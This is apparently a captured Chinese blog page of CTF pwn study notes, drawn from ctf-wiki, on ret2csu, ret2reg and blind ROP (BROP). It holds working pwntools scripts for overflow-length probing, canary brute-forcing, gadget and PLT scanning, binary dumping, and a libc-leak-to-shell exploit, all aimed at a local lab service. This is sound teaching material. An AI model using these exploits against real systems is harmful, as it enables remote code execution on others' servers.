探针，位于ret地址处，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。  Stop ret地址后面经过预期几个gadget处的位置，不会使得程序崩溃的 stop gadget 的地址。  Trap stop gadget之前和之后的部分填充的内容，可以导致程序崩溃的地址。我们可以通过在栈上摆放不同顺序的Stop 与 Trap 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子  probe,stop,traps(traps,traps,…)          我们通过程序崩溃与否 ，可以找到不会对栈进行 pop 操作的 gadget，如                  ret          xor eax,eax; ret                      probe,trap,stop,traps          我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如                  pop rax; ret          pop rdi; ret                      probe, trap, trap, trap, trap, trap, trap, stop, traps          我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，这里一般来说会遇到两处比较有意思的地方                  plt 处不会崩，，          _start 处不会崩，相当于程序重新执行。                    # get ret2csu_addrdef get_gadgets_addr(stop_gadget):	address = 0x400750	while True:		p = remote(&#39;127.0.0.1&#39;,1111)		payload = &quot;A&quot; * 72 + p64(address) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget)		p.recvuntil(&#39;\n&#39;)		p.send(payload)		try:		    output = p.recv()		    log.info(&quot;find gadgets at 0x%x&quot; % address)		    p.close()		    return		except EOFError as e: 		    address += 1		    p.close()		    log.info(&quot;dead connection! at 0x%x&quot; % address)		p.close()		    get_gadgets_addr(0x004006ad)到这里我们就确定了stop gadget 和 ret2csu的地址。寻找plt如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。ppppppr_addr = 0x4007aagadget2 = ppppppr_addr - 0x1agadget1 = ppppppr_addrpop_rid_ret = ppppppr_addr + 9stop_gadget = 0x004006ad# get puts@pltdef get_puts_addr(length, rdi_ret, stop_gadget):    addr = 0x400000    while 1:        print hex(addr)        sh = remote(&#39;127.0.0.1&#39;, 1111)        sh.recvuntil(&#39;\n&#39;)        payload = &#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)        sh.send(payload)        try:            content = sh.recv()            if content.startswith(&#39;\x7fELF&#39;):                print &#39;find puts@plt addr: 0x%x&#39; % addr                return hex(addr)            sh.close()            addr += 1        except Exception as e:            sh.close()            addr += 1print get_puts_addr(72, pop_rid_ret, stop_gadget)#puts_plt = 0x400560在进行测试时，我得到了这么几个地址的值，为了确定哪个是真正的puts@plt的地址，我们可以进行分析。0x4005550x4005570x40055c0x40055e0x40055f0x4005600x4005610x400566  在puts@plt没有解析过时，plt表中函数第一条指令是跳转到对应的got表中，此时got表中存储的是plt表中的第二条指令，然后进行压栈，并跳转到plt表首，然后进入dl_resolve进行延时绑定，将函数地址写入got表中。  在puts@plt经过解析后，plt表中的函数地址第一条仍然不变，但是got表中的值变成了真正的函数值，所以此时会直接跳转到真正的函数入口处，不会再跳转到plt表中。所以，基于elf文件的延时绑定机制，对于上面我们得到的疑似puts@plt的地址，前面几个肯定是在plt表项前面的指令，这样顺序执行指令也不有问题。而最后一个能真确执行puts的地址，肯定是属于puts@plt没有解析的情况下，程序进入plt表首，然后调用dl_resolve来调用puts函数，所以最后一个地址是puts@plt的第二条指令，即压栈操作，而压栈操作是在plt表函数的第二条位置，偏移量是6，所以我们就能得到正确的puts_plt的函数地址是0x400560。dump文件在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下：# dump filedef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):    sh = remote(&#39;127.0.0.1&#39;, 1111)    payload = &#39;a&#39; * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)    sh.recvuntil(&#39;\n&#39;)    sh.send(payload)    try:        data = sh.recv()        sh.close()        try:            data = data[:data.index(&quot;WelCome&quot;)]        except Exception:            data = data        #print len(data)        if data == &quot;&quot;:            data = &#39;\x00&#39;        return data    except Exception:        sh.close()        return Nonelength = 72brop_gadget = 0x4007aastop_gadget = 0x4006ADputs_plt = 0x400560addr = 0x400500rdi_ret = brop_gadget + 9result = &quot;&quot;while addr &lt; 0x400600:    print hex(addr)    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)    if data is None:        continue    else:    	if data == &#39;\x0a&#39;:    		data = &#39;\x00&#39;        result += data    addr += len(data)with open(&#39;code&#39;, &#39;wb&#39;) as f:    f.write(result)这说明，puts@got 的地址为 0x601018。然后我们进行整体的程序利用就行了。exploit#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from sys import *import osip = &#39;127.0.0.1&#39; port = 1111context.log_level = &#39;debug&#39;context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = remote(ip,port)elf = ELF(&quot;./brop&quot;)libc = elf.libc#length = getbufferflow_length()length = 72#stop_gadget = get_stop_addr(length)stop_gadget = 0x4006ad#ppppppr_addr = find_brop_gadget(length, stop_gadget)ppppppr_addr = 0x4007aagadget1 = ppppppr_addrgadget2 = ppppppr_addr - 0x1ardi_ret = ppppppr_addr + 9#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)puts_plt = 0x400560# puts_got = 0x601018puts_got = 0x601018#s = gdb.debug(&#39;./brop&#39;,&#39;&#39;&#39;#b main#&#39;&#39;&#39;)s.recv()payload = &#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)s.send(payload)puts_addr = u64(s.recv(6).ljust(8, &#39;\x00&#39;))log.success(&quot;puts_addr -&gt; {:#x}&quot;.format(puts_addr))libc.address = puts_addr - libc.symbols[&#39;puts&#39;]log.success(&quot;libc address -&gt; {:#x}&quot;.format(libc.address))s.recv()payload = &#39;a&#39; * length +  p64(libc.address+0x45254) + p64(0) * 7s.send(payload)#s.recv()s.interactive()">
+    <meta itemprop="datePublished" content="March 02, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Pwnit 4
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  5 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#ret2csu">ret2csu</a></li>
+  <li><a href="#ret2reg">ret2reg</a></li>
+  <li><a href="#brop">BROP</a>
+    <ul>
+      <li><a href="#栈溢出长度">栈溢出长度</a></li>
+      <li><a href="#canary保护">canary保护</a></li>
+      <li><a href="#寻找-gadgets">寻找 GADGETS</a></li>
+      <li><a href="#寻找plt">寻找plt</a></li>
+      <li><a href="#dump文件">dump文件</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploit">exploit</a></li>
+</ul>
+            </nav>
+          </aside>
+        
+        <blockquote>
+  <p>pwn学习资料，来自ctf-wiki。
+中级 ROP</p>
+</blockquote>
+
+<hr />
+
+<h1 id="ret2csu">ret2csu</h1>
+
+<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
+
+<p><img src="images/Snipaste_2019-03-02_14-02-38.png" alt="Snipaste_2019-03-02_13-58-50" /></p>
+
+<ul>
+  <li>从+90 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>
+  <li>从 +64 到 +70，我们可以将 r15 赋给 rdx, 将 r14 赋给 rsi，将 r13d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>
+  <li>从 +77 到 +86，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 == rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>
+</ul>
+
+<p>以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。这个题就是个简单的栈溢出，但是要ret2libc的话，需要leak info，由于只有read和write函数，x64位下用write来打印GOT表需要3个参数，这就要我们控制rdi，rsi和rdx。而我们用rop工具并不能找到这么多gadget。</p>
+
+<p><img src="images/Snipaste_2019-03-02_14-22-58.png" alt="Snipaste_2019-03-02_14-22-58" /></p>
+
+<p>所以我们可以使用lib2csu来控制regs，继而ret2libc。脚本如下，csu用来进行ret2csu，参数用于glibc2.28，其实和一般的ret2libc差不多，区别是没有用来rdx的gadget。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># r12(r13, r14, r15) -&gt; ret
+</span><span class="k">def</span> <span class="nf">csu</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">r12</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">rbx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rbp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
+  <span class="n">csu_first</span> <span class="o">=</span> <span class="mh">0x04011ea</span>
+  <span class="n">csu_second</span> <span class="o">=</span> <span class="mh">0x04011d0</span>
+  <span class="c1"># First step
+</span>  <span class="c1"># pop rbx, rbp, r12, r13, r14, r15
+</span>    
+    <span class="c1"># Second step
+</span>    <span class="c1"># rdx = r15
+</span>    <span class="c1"># rsi = r14
+</span>    <span class="c1"># rdi = edi = r13d
+</span>    <span class="c1"># rbx = 0, rbp = 1
+</span>    <span class="c1"># call r12
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_first</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r13</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r14</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_second</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="s">'b'</span> <span class="o">*</span> <span class="mh">0x38</span>
+	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+	<span class="n">csu</span><span class="p">(</span><span class="mi">136</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="mi">8</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
+	<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc.address -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+	
+	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">136</span><span class="p">),</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x45254</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+	<span class="c1">#s.recv()
+</span>	<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
+
+<p>改进 1 - 提前控制 RBX 与 RBP：可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。</p>
+
+<p>改进 2 - 多次利用：其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p>
+
+<ul>
+  <li>漏洞可以被多次触发</li>
+  <li>在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。</li>
+</ul>
+
+<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>
+
+<p>总结一下，在上面的 libc_csu_init 中我们主要利用了以下寄存器</p>
+
+<ul>
+  <li>利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。</li>
+  <li>利用中间部分的代码控制了 rdx，rsi，edi。</li>
+</ul>
+
+<h1 id="ret2reg">ret2reg</h1>
+
+<ol>
+  <li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
+  <li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li>
+  <li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li>
+</ol>
+
+<h1 id="brop">BROP</h1>
+
+<p>BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。</p>
+
+<ol>
+  <li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
+  <li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
+</ol>
+
+<p>在 BROP 中，基本的遵循的思路如下</p>
+
+<ul>
+  <li>判断栈溢出长度
+    <ul>
+      <li>暴力枚举</li>
+    </ul>
+  </li>
+  <li>Stack Reading
+    <ul>
+      <li>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</li>
+    </ul>
+  </li>
+  <li>Blind ROP
+    <ul>
+      <li>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</li>
+    </ul>
+  </li>
+  <li>Build the exploit
+    <ul>
+      <li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="栈溢出长度">栈溢出长度</h2>
+
+<p>首先检测输入长度来进行栈溢出。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getBufferLength</span><span class="p">():</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">1111</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="s">'a'</span><span class="p">)</span>
+            <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">output</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'No password'</span><span class="p">):</span>
+                <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="k">print</span> <span class="n">getBufferLength</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="images/Snipaste_2019-03-02_18-46-50.png" alt="Snipaste_2019-03-02_18-46-50" /></p>
+
+<h2 id="canary保护">canary保护</h2>
+
+<p>然后要绕过canary的保护，这里就采用爆破的方式，由于canary的最低为都是0，32位程序只要爆破256*3次就行了。代码如下，没运行过，应该没问题：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">1234</span><span class="p">)</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+	<span class="c1"># offset = 50
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">i</span>
+		<span class="n">out</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+	<span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+		<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">out</span>
+		<span class="k">print</span> <span class="s">'*'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span> <span class="s">'*'</span><span class="o">*</span><span class="mi">8</span>
+		<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>在爆破完canary之后，我们就要控制返回地址来泄露整个程序，一般通过wrtie和puts函数，而puts会截断，write函数需要的参数又多，两者都不简单，这里使用write函数进行介绍，而最简单的执行 write 函数的方法就是构造系统调用。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span> <span class="err">#</span> <span class="n">socket</span>
+<span class="n">pop</span> <span class="n">rsi</span><span class="p">;</span> <span class="n">ret</span> <span class="err">#</span> <span class="n">buffer</span>
+<span class="n">pop</span> <span class="n">rdx</span><span class="p">;</span> <span class="n">ret</span> <span class="err">#</span> <span class="n">length</span>
+<span class="n">pop</span> <span class="n">rax</span><span class="p">;</span> <span class="n">ret</span> <span class="err">#</span> <span class="n">write</span> <span class="n">syscall</span> <span class="n">number</span>
+<span class="n">syscall</span>
+</code></pre></div></div>
+
+<p>但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。write函数一般可以在plt表中找到，三个参数rdi，rsi，rdx的前两个可以在libc2csu中，而在程序中rdx一般不为0，因为这个参数是用来输出长度的。所以我们先要进行寻找gadgets，然后再去寻找plt表中的各个函数。</p>
+
+<h2 id="寻找-gadgets">寻找 GADGETS</h2>
+
+<p>首先，我们来想办法寻找 gadgets。此时，由于不知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况。</p>
+
+<ul>
+  <li>程序直接崩溃</li>
+  <li>程序运行一段时间后崩溃</li>
+  <li>程序一直运行而并不崩溃</li>
+</ul>
+
+<p>为了寻找合理的 gadgets，我们首先要找到一个可以使程序保持一个状态的地址，称为<code class="highlighter-rouge">stop gadget</code>，当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。他的意思就如下图所示，当我们在进行gadget测试时候，假如我们测试到了gadget，ret指令会将栈中的地址作为返回地址，也就是说，如果我们不在进行测试的gadget后面附上stop gadget，程序的运行状态是不可知的，我们必须使用一个可控的程序状态。比如说再次跳转到主函数，这样我们又能重复这一次gadget的测试操作，进而找到我们需要的gadget。</p>
+
+<p><img src="images/stop_gadget.png" alt="stop_gadget" /></p>
+
+<p>检测代码如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># log in file
+</span><span class="k">def</span> <span class="nf">log_in_file</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'gadget.txt'</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"gadget addr : </span><span class="si">%#</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">get_hang_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span><span class="mi">1111</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"alive ! at 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
+        <span class="n">log_in_file</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span> 
+        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"dead connection! at 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+    	<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"else at 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x00400000</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">get_hang_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+	<span class="n">addr</span><span class="o">+=</span><span class="mi">1</span>
+</code></pre></div></div>
+
+<p><img src="images/Snipaste_2019-03-04_10-48-55.png" alt="stop_gadget" /></p>
+
+<p>不放心的话，我们可以对检测出来的gadget进行手工检测，一般都选用靠近主函数入口的地址，这样可以让程序再运行一次。</p>
+
+<p>这里论文中定义了3种状态：</p>
+
+<ul>
+  <li><strong>Probe</strong> 探针，位于ret地址处，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。</li>
+  <li><strong>Stop</strong> ret地址后面经过预期几个gadget处的位置，不会使得程序崩溃的 stop gadget 的地址。</li>
+  <li><strong>Trap</strong> stop gadget之前和之后的部分填充的内容，可以导致程序崩溃的地址。</li>
+</ul>
+
+<p>我们可以通过在栈上摆放不同顺序的<strong>Stop</strong> 与 <strong>Trap</strong> 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子</p>
+
+<ul>
+  <li>probe,stop,traps(traps,traps,…)
+    <ul>
+      <li>我们通过程序崩溃与否 ，可以找到不会对栈进行 pop 操作的 gadget，如
+        <ul>
+          <li>ret</li>
+          <li>xor eax,eax; ret</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>probe,trap,stop,traps
+    <ul>
+      <li>我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如
+        <ul>
+          <li>pop rax; ret</li>
+          <li>pop rdi; ret</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>probe, trap, trap, trap, trap, trap, trap, stop, traps
+    <ul>
+      <li>我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。<strong>这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，</strong>这里一般来说会遇到两处比较有意思的地方
+        <ul>
+          <li>plt 处不会崩，，</li>
+          <li>_start 处不会崩，相当于程序重新执行。</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># get ret2csu_addr
+</span><span class="k">def</span> <span class="nf">get_gadgets_addr</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">):</span>
+	<span class="n">address</span> <span class="o">=</span> <span class="mh">0x400750</span>
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span><span class="mi">1111</span><span class="p">)</span>
